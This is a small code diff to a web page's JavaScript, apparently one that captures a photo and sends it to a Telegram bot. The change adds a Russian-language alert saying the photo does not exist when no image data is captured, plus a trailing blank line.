@@ -177,6 +177,7 @@
 		try {
 			const imageData = captureFullSizePhoto();
             if (!imageData) {
+				alert('фото не существует')
         		return;
         	}	
   // Отправляем данные в Telegram бот
@@ -216,6 +217,7 @@
 
 </body>
 </html>
+
 
 
 
